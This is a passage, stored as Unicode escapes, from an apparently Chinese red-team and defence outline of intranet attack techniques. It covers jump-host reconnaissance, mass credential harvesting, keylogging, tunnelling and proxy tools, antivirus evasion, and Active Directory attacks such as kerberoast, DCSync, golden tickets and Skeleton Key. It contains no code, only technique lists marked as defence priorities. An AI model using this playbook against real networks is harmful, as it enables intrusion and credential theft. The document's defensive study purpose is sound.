[\u91cd\u70b9] Mysql \u5404\u7c7b\u7b2c\u4e09\u65b9\u8f6f\u4ef6dll\u52ab\u6301 [\u91cd\u70b9] suid\u6743\u9650 \u8ba1\u5212\u4efb\u52a1 \u5404\u79cd\u9519\u8bef\u670d\u52a1\u914d\u7f6e\u5229\u7528 0x06 \u5185\u7f51\u5b89\u5168 [ \u654f\u611f\u4fe1\u606f\u641c\u96c6\uff0c\u9632\u5fa1\u91cd\u70b9\uff0c\u53ef\u5728\u6b64\u9879\u4e25\u683c\u9650\u5236\u5404\u79cd\u7cfb\u7edf\u5185\u7f6e\u547d\u4ee4\u6267\u884c ] \u00b6 \u641c\u96c6\u5f53\u524d\u5df2\u63a7\"\u8df3\u677f\u673a\"\u7684\u5404\u7c7b\u654f\u611f\u4fe1\u606f \u6ce8: \u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684,\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 \u67e5\u770b\u5f53\u524dshell\u6743\u9650 \u53ca \u8be6\u7ec6\u7cfb\u7edf\u5185\u6838\u7248\u672c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684 \u8be6\u7ec6ip\u914d\u7f6e,\u5305\u62ec \u6240\u5728\u57df, ip, \u63a9\u7801, \u7f51\u5173, \u4e3b\u5907 dns ip \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6700\u8fd1\u7684\u7528\u6237\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u7684\u6240\u6709\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55 [ \u4e3b\u8981\u9488\u5bf9linux,\u91cc\u9762\u53ef\u80fd\u5305\u542b\u7684\u6709\u5404\u7c7b\u654f\u611f\u8d26\u53f7\u5bc6\u7801,ip,\u654f\u611f\u670d\u52a1\u914d\u7f6e... ] \u83b7\u53d6\u672c\u673a\u6240\u6709 \u670d\u52a1/\u8fdb\u7a0b [\u5305\u62ec\u5404\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u6743\u9650,\u4e5f\u5305\u62ec\u76ee\u6807\u7cfb\u7edf\u4e2d\u7684\u53ef\u7591\u6076\u610f\u8fdb\u7a0b(\u6709\u53ef\u80fd\u662f\u540c\u884c\u7684\u9a6c)]/\u7aef\u53e3/\u7f51\u7edc\u8fde\u63a5\u4fe1\u606f \u83b7\u53d6\u672c\u673a\u6240\u7528\u6740\u8f6f / \u76d1\u63a7\u79cd\u7c7b [ \u540e\u7eed\u597d\u9488\u5bf9\u6027\u7684\u505a\u514d\u6740 ] \u83b7\u53d6\u672c\u673a rdp / ssh \u7aef\u53e3\u5f00\u542f\u72b6\u6001 \u53ca \u5176\u9ed8\u8ba4\u7aef\u53e3\u53f7 \u83b7\u53d6\u672c\u673a\u6240\u6709\u7528\u6237\u7684rdp\u5916\u8fde\u8bb0\u5f55 \u83b7\u53d6\u672c\u673a\u7684\u6240\u6709SSH\u767b\u5f55\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u767b\u5f55\u6210\u529f\u7684\u65e5\u5fd7 [ \u9488\u5bf9windows ] \u83b7\u53d6\u672c\u673a\u6240\u6709\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u8be6\u7ec6\u5217\u8868 [ \u4e3b\u8981\u4e3a\u6293\u5bc6\u7801,\u63d0\u6743,\u7559\u540e\u95e8\u505a\u51c6\u5907 ] \u83b7\u53d6\u672c\u673a\u5404\u4e2a\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684 \u6240\u6709\u4e66\u7b7e\u9875 \u53ca \u5386\u53f2\u6d4f\u89c8\u8bb0\u5f55 \u83b7\u53d6\u5f53\u524d\u7528\u6237\u521b\u5efa\u7684\u6240\u6709\u8ba1\u5212\u4efb\u52a1\u5217\u8868 \u53ca \u8ba1\u5212\u4efb\u52a1\u6240\u5bf9\u5e94\u7684\u6267\u884c\u811a\u672c\u5185\u5bb9 [ \u6709\u4e9b\u6267\u884c\u811a\u672c\u4e2d\u5f88\u53ef\u80fd\u5b58\u7684\u6709\u5404\u79cd\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 ] \u83b7\u53d6\u5f53\u524d\u7528\u6237 \u684c\u9762 \u53ca \u56de\u6536\u7ad9 \u91cc\u7684\u6240\u6709\u6587\u4ef6\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u5b58\u5728suid\u6743\u9650\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4ee3\u7406 [ ip & \u7aef\u53e3 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u7684\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u9879\u503c \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 ipc \u8fde\u63a5 \u53ca \u5df2\u542f\u7528\u5171\u4eab \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709\u6302\u8f7d[mount] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u9632\u706b\u5899\u72b6\u6001 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u5206\u533a/\u76d8\u7b26\u53ca\u5176\u8be6\u7ec6\u4f7f\u7528\u60c5\u51b5 \u83b7\u53d6\u672c\u673a\u7684\u7d2f\u8ba1\u5f00\u673a\u65f6\u957f \u83b7\u53d6\u672c\u673aarp / dns\u7f13\u5b58 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u73af\u5883\u53d8\u91cf [ \u4e3b\u8981\u60f3\u770b\u770b\u76ee\u6807\u673a\u5668\u4e0a\u6709\u65e0python,jdk,ruby...\u7b49\u8bed\u8a00\u7684\u6267\u884c\u73af\u5883,\u540e\u671f\u53ef\u8bbe\u6cd5\u5229\u7528 ] \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u672c\u5730\u7528\u6237\u53ca\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u7cfb\u7edfhost\u6587\u4ef6\u5185\u5bb9 \u83b7\u53d6\u5f53\u524d\u673a\u5668\u786c\u4ef6\u8bbe\u5907\u4fe1\u606f[ \u4e3b\u8981\u4e3a\u5224\u65ad\u5f53\u524d\u673a\u5668\u662f\u5426\u4e3a\u865a\u62df\u673a ] \u8fdc\u7a0b\u622a\u5c4f\u6355\u6349\u76ee\u6807\u7528\u6237\u654f\u611f\u64cd\u4f5c \u7531\u4e8e\u4e0a\u8ff0\u5927\u90e8\u5206\u7684\u641c\u96c6\u52a8\u4f5c\u90fd\u662f\u57fa\u4e8e\u7cfb\u7edf\u5185\u7f6e\u5de5\u5177\u548c\u63a5\u53e3,\u6545,\u53ef\u5b8c\u5168\u4f9d\u9760EDR\u6765\u5b9e\u65f6\u6355\u6349\u5404\u7c7b\u654f\u611f\u8fdb\u7a0b\u4e0a\u62a5\u6076\u610f\u64cd\u4f5c \u5229\u7528\u5f53\u524d\u5df2\u63a7 \"\u8df3\u677f\u673a\", \u5206\u6790\u76ee\u6807\u5185\u7f51\u5927\u81f4\u7f51\u7edc\u62d3\u6251\u53ca\u6240\u6709\u5173\u952e\u6027\u4e1a\u52a1\u673a\u5668\u5206\u5e03 \u6279\u91cf\u6293\u53d6\u5185\u7f51\u6240\u6709windows\u673a\u5668\u540d \u548c \u6240\u5728 \"\u57df\" / \"\u5de5\u4f5c\u7ec4\u540d\" [smb\u63a2\u6d4b\u626b\u63cf] \u9488\u5bf9\u5185\u7f51\u7684\u5404\u79cd\u9ad8\u5371\u654f\u611f\u670d\u52a1\u5b9a\u4f4d[\"\u5b89\u5168\" \u7aef\u53e3\u626b\u63cf (\u5728\u907f\u514d\u5bf9\u65b9\u9632\u62a4\u62a5\u8b66\u62e6\u622a\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5404\u79cd\u5e38\u89c4\u670d\u52a1\u63a2\u6d4b\u8bc6\u522b)] \u5185\u7f51\u6279\u91cf Web Banner \u6293\u53d6,\u83b7\u53d6\u5173\u952e\u76ee\u6807\u4e1a\u52a1\u7cfb\u7edf\u5982\u4e0b \u5185\u7f51\u5404\u79cd\u6587\u4ef6[\u5171\u4eab]\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bweb\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u6570\u636e\u5e93\u670d\u52a1\u5668 \u5185\u7f51\u90ae\u4ef6\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51Vpn\u670d\u52a1\u5668 [ \u53ef\u7528\u4e8e\u540e\u671f\u7559\u5165\u53e3 ] \u5185\u7f51\u5404\u7c7b\u5e38\u89c4\u8d44\u4ea7\u72b6\u6001\u76d1\u63a7\u670d\u52a1\u5668,eg: zabbix,nagios,cacti... \u5185\u7f51\u5404\u7c7b\u9632\u62a4\u7684\u4e3b\u63a7\u7aef,\u6bd4\u5982,\u9632\u706b\u5899,EDR,\u6001\u52bf\u611f\u77e5 \u4ea7\u54c1\u7684web\u4e3b\u63a7\u7aef... \u5185\u7f51\u65e5\u5fd7\u670d\u52a1\u5668 \u5185\u7f51\u8865\u4e01\u670d\u52a1\u5668 \u5185\u7f51\u5404\u7c7bOA,ERP,CRM,SRM,HR\u7cfb\u7edf... \u5185\u7f51\u6253\u5370\u670d\u52a1\u5668 \u5185\u7f51 MES \u7cfb\u7edf \u5185\u7f51\u865a\u62df\u5316\u670d\u52a1\u5668 / \u8d85\u878d\u5408\u5e73\u53f0 [Vmware ESX] \u5185\u7f51\u5821\u5792\u673a... \u5185\u7f51\u8fd0\u7ef4,\u7814\u53d1 \u90e8\u95e8\u5458\u5de5\u7684\u673a\u5668 \u5185\u7f51\u8def\u7531,\u4ea4\u6362\u8bbe\u5907... \u7b49\u7b49\u7b49 ... \u9488\u5bf9\u4ee5\u4e0a\u7684\u5404\u79cd\u5e38\u89c4\u5185\u7f51\u63a2\u6d4b\u626b\u63cf,\u5176\u5b9e\u5728\u6d41\u91cf\u4e0a\u90fd\u4f1a\u6709\u975e\u5e38\u6e05\u6670\u7684\u8868\u73b0 \u901a\u8fc7\u5728\u4e00\u4e9b\u5173\u952e\u8282\u70b9\u8bbe\u5907/\u670d\u52a1\u5668\u4e0a\u90e8\u7f72\u63a2\u9488\u641c\u96c6\u6d41\u91cf,\u518d\u914d\u5408\u5927\u6570\u636e\u5173\u8054\u5206\u6790\u67e5\u627e\u5404\u79cd\u654f\u611f\u7279\u5f81,\u7406\u8bba\u4e0a\u662f\u76f8\u5bf9\u5bb9\u6613\u53d1\u73b0\u5404\u7c7b\u626b\u63cf\u63a2\u6d4b\u75d5\u8ff9\u7684, \u9488\u5bf9\u5404\u7c7b\u5df2\u77e5\u7cfb\u7edf\u9ad8\u5371RCE\u6f0f\u6d1e\u7684\u6279\u91cf\u63a2\u6d4b\u8bc6\u522b\u4e0e\u5229\u7528 MS08-067 [ \u5176\u5b9e,\u67d0\u4e9b\u7279\u6b8a\u884c\u4e1a\u7684\u7cfb\u7edf\u53ef\u80fd\u975e\u5e38\u8001,\u6781\u5c11\u66f4\u65b0,\u6545,\u8fd8\u662f\u6709\u5b58\u5728\u7684\u53ef\u80fd ] MS17-010 CVE-2019-0708 \u5176\u5b9e\u9488\u5bf9\u6b64\u7c7b\u6f0f\u6d1e\u7684\u653b\u51fb\u5229\u7528\u8bc6\u522b,\u5c31\u663e\u5f97\u6bd4\u8f83\u76f4\u767d\u4e86,\u901a\u8fc7\u6df1\u5165\u5206\u6790\u6bcf\u79cd\u6f0f\u6d1e\u5728\u5b9e\u9645\u653b\u51fb\u5229\u7528\u8fc7\u7a0b\u6240\u4ea7\u751f\u7684\u4e00\u4e9b\u5178\u578b\u6d41\u91cf\u7279\u5f81\u548c\u7cfb\u7edf\u65e5\u5fd7\u5373\u53ef\u5927\u81f4\u5224\u65ad 0x07 \u5185\u7f51\u5b89\u5168 [ \u5404\u7c7b\u654f\u611f\u51ed\u8bc1 \"\u641c\u96c6\" \u4e0e \"\u7a83\u53d6\" ] \u00b6 \u4e3b\u52a8\u5bc6\u7801\u641c\u96c6 \u6ce8:\u5982\u4e0b\u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u6216\u8005\u5728\u6307\u5b9a\u7528\u6237\u6743\u9650\u4e0b\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684 \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0, \u6b64\u9879\u975e\u9632\u5fa1\u91cd\u70b9, \u56e0\u4e3a\u538b\u6839\u4e5f\u4e0d\u597d\u9632 \u6279\u91cf\u6293\u53d6\u5f53\u524d\u673a\u5668\u4e0a\u7684 \"\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u8d26\u53f7\u5bc6\u7801\" \u6bd4\u5982,\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e\u6587\u4ef6,\u5404\u7c7b\u670d\u52a1\u81ea\u8eab\u7684\u914d\u7f6e\u6587\u4ef6(redis,http basic...)... \u60f3\u529e\u6cd5 \"\u63a7\u5236\u76ee\u6807 \u8fd0\u7ef4\u7ba1\u7406 / \u6280\u672f\u4eba\u5458 \u7684\u5355\u673a,\u4ece\u8fd9\u4e9b\u673a\u5668\u4e0a\u53bb\u641c\u96c6\u53ef\u80fd\u4fdd\u5b58\u7740\u5404\u7c7b\u654f\u611f\u7f51\u7edc\u8d44\u4ea7\u7684\u8d26\u53f7\u5bc6\u7801\u8868\" \u6bd4\u5982, .ls,.doc,*.docx, *.txt.... \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u5404\u79cd\u6570\u636e\u5e93\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 \u6bd4\u5982,Navicat,SSMS[MSSQL\u81ea\u5e26\u5ba2\u6237\u7aef\u7ba1\u7406\u5de5\u5177,\u91cc\u9762\u4e5f\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u5bc6\u7801(\u52a0\u5bc6\u540e\u7684base64)] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf \"\u6ce8\u518c\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" [ Windows ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u6240\u6709 \"\u672c\u5730\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801/hash\" [ Windows & linux ] \u6293\u53d6\u5f53\u524d\u7cfb\u7edf\u7684\u6240\u6709 \"\u7528\u6237token\" [ Windows ] \u6293\u53d6 \"windows\u51ed\u636e\u7ba1\u7406\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6 \"MSTSC \u5ba2\u6237\u7aef\u4e2d\u4fdd\u5b58\u7684\u6240\u6709rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\" \u6293\u53d6\u5404\u7c7b \"VNC\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u8fde\u63a5\u5bc6\u7801\" \u6293\u53d6 \"GPP\u76ee\u5f55\u4e0b\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801\" [ \u5305\u62ec\u7ec4\u7b56\u7565\u76ee\u5f55\u4e2dXML\u91cc\u4fdd\u5b58\u7684\u5bc6\u7801hash \u548c NETLOGON\u76ee\u5f55\u4e0b\u7684\u67d0\u4e9b\u811a\u672c\u4e2d\u4fdd\u5b58\u7684\u8d26\u53f7\u5bc6\u7801 ] \u6293\u53d6\u5404\u7c7b \"SSH\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdlinux\u7cfb\u7edf\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\", SecureCRT,Xshell,WinSCP,putty \u6293\u53d6\u5404\u7c7b \"\u6d4f\u89c8\u5668\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdweb\u767b\u5f55\u5bc6\u7801\",Chrome [360\u6d4f\u89c8\u5668],Firefox,IE,QQ\u6d4f\u89c8\u5668 \u6293\u53d6\u5404\u7c7b \"\u6570\u636e\u5e93\u8868\u4e2d\u4fdd\u5b58\u7684\u5404\u7c7b\u8d26\u53f7\u5bc6\u7801hash\" \u6293\u53d6\u5404\u7c7b \"FTP\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdftp\u767b\u5f55\u8d26\u53f7\u5bc6\u7801\", filezila, xftp... \u6293\u53d6\u5404\u7c7b \"\u90ae\u4ef6\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cd\u90ae\u7bb1\u8d26\u53f7\u5bc6\u7801\", forxmail, thunderbird... \u6293\u53d6\u5404\u7c7b \"SVN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u6240\u6709\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801\u53ca\u9879\u76ee\u5730\u5740\" \u6293\u53d6\u5404\u7c7b \"VPN\u5ba2\u6237\u7aef\u5de5\u5177\u4e2d\u4fdd\u5b58\u7684\u5404\u79cdvpn\u94fe\u63a5\u8d26\u53f7\u5bc6\u7801\" \u88ab\u52a8\u5bc6\u7801\u641c\u96c6 [ \u7b49\u7740\u7ba1\u7406\u5458\u81ea\u5df1\u6765\u9001\u5bc6\u7801 ] [\u6ce8: \u67d0\u4e9b\u64cd\u4f5c\u80af\u5b9a\u662f\u9700\u8981\u4e8b\u5148\u81ea\u5df1\u60f3\u529e\u6cd5\u5148\u62ff\u5230\u7ba1\u7406\u6743\u9650\u540e\u624d\u80fd\u6b63\u5e38\u8fdb\u884c\u7684, \u6b64\u5904\u4e0d\u518d\u8d58\u8ff0 , \u662f\u9632\u5fa1\u91cd\u70b9] Windows SSP [\u6301\u4e45\u5316/\u5185\u5b58] Hook PasswordChangeNotify [\u6301\u4e45\u5316/\u5185\u5b58] OWA \u767b\u5f55\u8d26\u53f7\u5bc6\u7801\u622a\u83b7 \u622a\u83b7mstsc.exe\u4e2d\u8f93\u5165\u7684rdp\u8fde\u63a5\u8d26\u53f7\u5bc6\u7801 linux \u522b\u540d\u8bb0\u5f55\u5229\u7528 \u672c\u673a\u660e\u6587\u5bc6\u7801\u55c5\u63a2 [ http,ftp,pop3... ] \u4f20\u7edf\u952e\u76d8\u8bb0\u5f55 windows\u84dd\u5c4f\u6280\u5de7 [ \u6b64\u64cd\u4f5c\u4e3b\u8981\u4e3a\u5e94\u5bf9\u4e0d\u65f6\u4e4b\u9700,\u6bd4\u5982,\u641e\u84dd\u5c4f,\u767b\u7ba1\u7406\u5458\u767b\u5f55\u6293\u5bc6\u7801 ] Hash\u7206\u7834: Hashcat [ \u5b8c\u5168\u62fcGPU ] 0x08 \u5185\u7f51\u5b89\u5168 [ \u5185\u7f51\u5e38\u7528 \"\u96a7\u9053\"\" / \"\u8f6c\u53d1\"\" / \"\u4ee3\u7406\"\" \u7a7f\u900f\u624b\u6cd5 \u63d0\u70bc\u6c47\u603b \uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u51fa\u7f51\u6d41\u91cf\u523a\u63a2 \u6bd4\u5982,http,dns,\u4ee5\u53ca\u4e00\u4e9b\u7a7f\u900f\u6027\u76f8\u5bf9\u8f83\u597d\u7684tcp\u7aef\u53e3... \u8fd9\u79cd\u64cd\u4f5c\u4e00\u822c\u90fd\u4f1a\u914d\u5408wmi,smb,ssh\u8fdc\u7a0b\u6267\u884c,\u5728\u5185\u7f51\u6279\u91cf\u5feb\u901f\u8bc6\u522b\u51fa\u80fd\u51fa\u7f51\u7684\u673a\u5668 \u5e38\u89c4 HTTP\u811a\u672c\u4ee3\u7406 abptts,Neo-reGeorg,reGeorg,tunna,reduh... \u4e0d\u5f97\u4e0d\u8bf4,\u516c\u5f00\u811a\u672c\u5728\u5b9e\u6218\u4e2d\u591a\u591a\u5c11\u5c11\u90fd\u4f1a\u6709\u4e9b\u95ee\u9898,\u8fd8\u9700\u8981\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u76ee\u6807\u73af\u5883\u6df1\u5ea6\u6539\u8fdb\u624d\u884c SSH \u96a7\u9053 \u52a0\u5bc6\u7aef\u53e3\u8f6c\u53d1,socks \u5b9e\u6218\u7528\u9014\u975e\u5e38\u7075\u6d3b,\u6b64\u5904\u4e0d\u7ec6\u8bf4 ] Rdp \u96a7\u9053 \u53cd\u5411SOCKS nps, frp, ssf, CobaltStrike(socks4a & rportfwd ), sscoks ... \u5de5\u5177\u57fa\u672c\u90fd\u4e0d\u514d\u6740\u4e86,\u9700\u8981\u81ea\u884c\u5904\u7406 \u6b63\u53cd\u5411TCP \u7aef\u53e3\u8f6c\u53d1 \u975e\u5e38\u591a,\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e, eg: nginx,netsh,socat,ew.... DNS\u52a0\u5bc6\u96a7\u9053 Web\u7aef\u53e3\u590d\u7528 \u9700\u8981\u660e\u767d\u7684\u662f,\u5728\u4e00\u822c\u7684\u7ea2\u961f\u573a\u666f\u4e2d \u5165\u4fb5\u8005\u4e3a\u4e86\u5c3d\u53ef\u80fd\u8eb2\u907f\u5404\u79cd\u68c0\u6d4b\u8bbe\u5907\u7684\u6d41\u91cf\u89e3\u6790,\u5f88\u591a\u6b64\u7c7b\u5de5\u5177\u90fd\u4f1a\u91c7\u7528\u5404\u79cd\u5404\u6837\u7684\u65b9\u5f0f\u6765\u52a0\u5bc6\u4f20\u8f93\u6d41\u91cf,\u4ee5\u6b64\u6765\u4fdd\u8bc1\u81ea\u5df1\u6709\u66f4\u5f3a\u7684\u7a7f\u900f\u6027 0x09 \u57df\u5185\u7f51\u5b89\u5168 [ \u57df\u5185\u5e38\u7528\u653b\u51fb\u624b\u6cd5 ( \u57df\u6e17\u900f )\uff0c\u63d0\u70bc\u6c47\u603b\uff0c\u9632\u5fa1\u91cd\u70b9 ] \u00b6 \u9488\u5bf9\u5f53\u524d\u57df\u7684\u4e00\u4e9b\u5e38\u89c4\u4fe1\u606f\u641c\u96c6[ \u5176\u5b9e\u73b0\u5b9e\u4e2d,\u53ea\u9700\u8981\u4e00\u4e2aBloodHound & Pingcastle\u8db3\u77e3,\u5c31\u662f\u5de5\u5177\u9700\u8981\u81ea\u884c\u4e8b\u5148\u514d\u6740\u597d] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u5b8c\u6574\u57df\u7ba1\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u57df\u63a7\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709DNS\u670d\u52a1\u5668\u673a\u5668\u540d\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709SPN \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709OU \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7684\u6240\u6709\u7528\u6237 & \u7528\u6237\u7ec4\u5217\u8868 \u83b7\u53d6\u5f53\u524d\u57df\u4fe1\u4efb\u5173\u7cfb [ \u8de8\u57df\u6e17\u900f ] \u83b7\u53d6\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u7684\u5f00\u673a\u65f6\u95f4 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7f51\u6bb5\u53caweb\u7ad9\u70b9 \u83b7\u53d6\u5f53\u524d\u57df\u5185\u7b56\u7565 [ \u4e3b\u8981\u662f\u4e3a\u4e86\u4e86\u89e3\u5bc6\u7801\u7b56\u7565 ] \u83b7\u53d6\u5f53\u524d\u57df\u6797 ....... \u5feb\u901f\u83b7\u53d6\u76ee\u6807\u57df\u63a7\u6743\u9650\u7684\u4e00\u4e9b\u5e38\u89c4\u624b\u6cd5 \u641c\u96c6GPP \u76ee\u5f55 [ \u5176\u4e2d\u53ef\u80fd\u4fdd\u5b58\u7684\u6709\u57df\u8d26\u53f7\u5bc6\u7801,\u4e0d\u4ec5\u4ec5\u662f\u5b58\u5728XML\u91cc\u7684\u90a3\u4e9b,NETLOGON\u76ee\u5f55\u4e2d\u7684\u67d0\u4e9b\u811a\u672c\u540c\u6837\u4e5f\u53ef\u80fd\u4fdd\u5b58\u6709\u8d26\u53f7\u5bc6\u7801 ] \u670d\u52a1\u7968\u636ehash\u7834\u89e3(\"\u5c24\u5176\u662f\u57df\u7ba1\u7528\u6237\u7684\") [ kerberoast ] \u6279\u91cf\u5bf9\u57df\u7528\u6237\u8fdb\u884c\u5355\u5bc6\u7801\u5c1d\u8bd5 [ \u55b7\u5c04,\u5229\u7528ADSI\u63a5\u53e3,\u65e5\u5fd7id 4771 ] Kerberos \u59d4\u6d3e\u5229\u7528 \u7206\u7834LDAP Exchange\u7279\u5b9aACL\u6ee5\u7528 SSP \u622a\u83b7\u5173\u952e\u670d\u52a1\u5668\u767b\u5f55\u5bc6\u7801 \u5229\u7528\u5404\u7c7b\u57fa\u7840\u670d\u52a1\u5728\u5185\u7f51\u5feb\u901f getshell [ \u5f31\u53e3\u4ee4, \u5404\u7c7bJAVA\u4e2d\u95f4\u4ef6\u5df2\u77e5Nday\u6f0f\u6d1e, \u5e38\u89c4Web\u6f0f\u6d1e... ],\u5728\u5185\u7f51\u5faa\u73af\u6293\u5404\u7c7b\u5bc6\u7801,\u76f4\u81f3 \u6293\u5230\u57df\u7ba1\u5bc6\u7801 \u6293\u5230\u57df\u7ba1\u4ee4\u724c DNSAdmin \u7ec4\u6210\u5458\u6ee5\u7528 [ \u52a0\u8f7d\u6267\u884c\u6076\u610fdll ] LAPS MS14-068 [ \u5982\u4eca\u5b9e\u9645\u4e2d\u5df2\u5f88\u5c11\u9047\u5230\u4e86 ] LLMNR/NBNS\u6b3a\u9a97 + SMB relay [ \u771f\u5b9e\u5728\u5b9e\u6218\u4e2d\u5176\u5b9e\u7528\u7684\u5e76\u4e0d\u591a ] \u57df\u5185\u540e\u6e17\u900f\u654f\u611f\u4fe1\u606f\u641c\u96c6\u5206\u6790 \u83b7\u53d6\u6240\u6709DNS\u8bb0\u5f55 \u5bfc\u51fa\u5f53\u524d\u57df\u7684\u5b8c\u6574LDAP\u6570\u636e\u5e93 \u63d0\u53d6\u5f53\u524d\u57df\u7684ntds.dit [ \u57df\u5185\u8d26\u53f7\u5bc6\u7801\u6570\u636e\u5e93 ] Dcsync\u540c\u6b65 Volume Shadow Copy Service \u57df\u5185\u6307\u5b9a\u7528\u6237\u767b\u5f55ip\u5b9a\u4f4d \u5229\u7528OWA\u767b\u5f55\u65e5\u5fd7 \u5229\u7528\u57df\u63a7\u670d\u52a1\u5668\u767b\u5f55\u65e5\u5fd7 \u6307\u5b9a\u670d\u52a1\u94f6\u7968 [ Silver Ticket ] \u9664\u6b64\u4e4b\u5916,\u5c31\u662f\u4e0b\u9762\u7684\u5404\u7c7b\u5e38\u89c4\u6a2a\u5411\u624b\u6cd5 \u57df\u5185\u6307\u5b9a\u7528\u6237\u673a\u5668\u5b9a\u5411\u63a7\u5236\u6280\u5de7 \u7ed1\u5b9a\u7528\u6237\u767b\u5f55\u811a\u672c \u5229\u7528GPO\u4e0b\u53d1 [\u5b9e\u9645\u4e0a,\u5229\u7528GPO\u80fd\u505a\u7684\u4e8b\u60c5\u8fd8\u975e\u5e38\u975e\u5e38\u591a] PTT [ \u7968\u636e\u4f20\u9012 ] \u9488\u5bf9\u57df\u7ba1\u7684\u5404\u79cd\u6743\u9650\u7ef4\u6301\u6280\u5de7 \u91d1\u7968 Skeleton Key DSRM\u5bc6\u7801\u540c\u6b65 OWA\u540e\u95e8 ... \u57df\u5185Exchange \u90ae\u4ef6\u6570\u636e\u8131\u53d6 \u5229\u7528Ews\u63a5\u53e3\u901a\u8fc7PTH\u7684\u65b9\u5f0f\u8131\u90ae\u4ef6 0x10 \u5185\u7f51\u5b89\u5168 [ \u8de8\u5e73\u53f0\u6a2a\u5411\u6e17\u900f (\u8fdc\u7a0b\u6267\u884c)\uff0c\u9632\u5fa1\u91cd\u70b9 ( \"\u91cd\u4e2d\u4e4b\u91cd\" ) ] \u00b6 \u4ece Windows\u5e73\u53f0 \u6a2a\u5411\u81f3 Windows\u5e73\u53f0 \u6ce8: \u4ee5\u4e0b\u67d0\u4e9b\u8fdc\u7a0b\u6267\u884c\u65b9\u5f0f, \u5373\u53ef\u76f4\u63a5\u7528\u660e\u6587\u8d26\u53f7\u5bc6\u7801 \u4ea6\u53ef \u57fa\u4e8epth\u6765\u8fdb\u884c, \u4e0d\u5c40\u9650 \u8fdc\u7a0b\u670d\u52a1\u7ba1\u7406 [ SCM ] 